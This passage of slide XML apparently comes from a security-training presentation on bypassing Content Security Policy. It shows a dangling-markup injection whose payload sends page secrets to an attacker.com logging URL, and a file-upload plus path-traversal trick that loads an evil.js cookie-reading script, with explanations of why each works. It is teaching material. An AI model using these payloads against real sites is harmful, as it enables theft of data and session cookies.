              <a:gd name="adj" fmla="val 889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486281" y="1831300"/>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Vulnerable Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486281" y="2072164"/>
            <a:ext cx="1687235" cy="2347436"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1008"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5480685" y="2072164"/>
            <a:ext cx="1698427" cy="2347436"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1002"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5594033" y="2157174"/>
            <a:ext cx="1471732" cy="2177415"/>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&lt;title&gt;Dangling Markup&lt;/title&gt;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&lt;p&gt;Hello, &lt;input type="text" value="&lt;!-- User controlled input --&gt;"&gt;&lt;/p&gt;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 Important data follows --&gt;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&lt;div id="secret-data"&gt;API_KEY_12345&lt;/div&gt;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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="1717953"/>
            <a:ext cx="1913811" cy="5190411"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7456884" y="1831300"/>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Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7456884" y="2072164"/>
            <a:ext cx="1687116" cy="714375"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7451288" y="2072164"/>
            <a:ext cx="1698308" cy="714375"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7564636" y="2157174"/>
            <a:ext cx="1471613" cy="544354"/>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https://victim.com/?value="&gt;&lt;img src="https://attacker.com/log?c=</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9314021" y="1717953"/>
            <a:ext cx="1913930" cy="5190411"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9427369" y="1831300"/>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Result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9427369" y="2072164"/>
            <a:ext cx="1687235" cy="2483525"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1008"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9421773" y="2072164"/>
            <a:ext cx="1698427" cy="2483525"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1002"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9535120" y="2157174"/>
            <a:ext cx="1471732" cy="2313503"/>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&lt;title&gt;Dangling Markup&lt;/title&gt;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&lt;/head&gt;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&lt;p&gt;Hello, &lt;input type="text" value=""&gt;&lt;img src="https://attacker.com/log?c=API_KEY_12345"&gt;&lt;/p&gt;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 Important data follows --&gt;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&lt;div id="secret-data"&gt;API_KEY_12345&lt;/div&gt;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&lt;/body&gt;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&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9427369" y="4619387"/>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Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9427369" y="4830485"/>
            <a:ext cx="1687235" cy="1905358"/>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User input closes the &lt;input&gt; tag's value attribute and then the &lt;input&gt; tag itself.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>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A new &lt;img&gt; tag is injected with an unclosed &lt;src&gt; attribute.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>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The browser tries to complete the &lt;img&gt; tag by appending subsequent HTML content to the &lt;src&gt; URL until it finds a closing &gt; (or EOF).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Sensitive data (API_KEY_12345) from the page is thus exfiltrated to the attacker's server as part of the image URL.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8183" y="728901"/>
            <a:ext cx="7735491" cy="498634"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 5: File Upload + Path Traversal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698183" y="1297662"/>
            <a:ext cx="2493526" cy="311587"/>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Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698183" y="1872377"/>
            <a:ext cx="13234035" cy="599123"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4995"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="688300" y="1872377"/>
            <a:ext cx="13253799" cy="599123"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4995"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="887730" y="2021919"/>
            <a:ext cx="12854940" cy="300038"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="235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Content-Security-Policy: script-src 'self' https://trusted.com/static/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698183" y="2734628"/>
            <a:ext cx="2493526" cy="311587"/>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Attack Steps:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698183" y="3309342"/>
            <a:ext cx="199430" cy="249317"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698183" y="3625453"/>
            <a:ext cx="4294346" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698183" y="3770828"/>
            <a:ext cx="4294346" cy="623173"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Upload malicious JavaScript to trusted.com:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698183" y="4591288"/>
            <a:ext cx="4294346" cy="899160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3328"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="688300" y="4591288"/>
            <a:ext cx="4314111" cy="899160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3328"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="887730" y="4740831"/>
            <a:ext cx="3915251" cy="600075"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="235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 evil.js</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="235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alert(document.cookie);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5167908" y="3309342"/>
            <a:ext cx="199430" cy="249317"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5167908" y="3625453"/>
            <a:ext cx="4294465" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5167908" y="3770828"/>
            <a:ext cx="2493526" cy="311587"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Upload location:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5167908" y="4279702"/>
            <a:ext cx="4294465" cy="599123"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4995"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5158026" y="4279702"/>
            <a:ext cx="4314230" cy="599123"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4995"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5357455" y="4429244"/>
            <a:ext cx="3915370" cy="300038"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="235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https://trusted.com/uploads/evil.js</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637752" y="3309342"/>
            <a:ext cx="199430" cy="249317"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637752" y="3625453"/>
            <a:ext cx="4294346" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637752" y="3770828"/>
            <a:ext cx="2662952" cy="311587"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Exploit path traversal:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637752" y="4279702"/>
            <a:ext cx="4294346" cy="1199198"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2495"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9627870" y="4279702"/>
            <a:ext cx="4314111" cy="1199198"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2495"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9827300" y="4429244"/>
            <a:ext cx="3915251" cy="900113"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="235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&lt;script src="https://trusted.com/static/../uploads/evil.js"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698183" y="5903119"/>
            <a:ext cx="2493526" cy="311587"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698183" y="6477833"/>
            <a:ext cx="13234035" cy="899852"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2350"/>
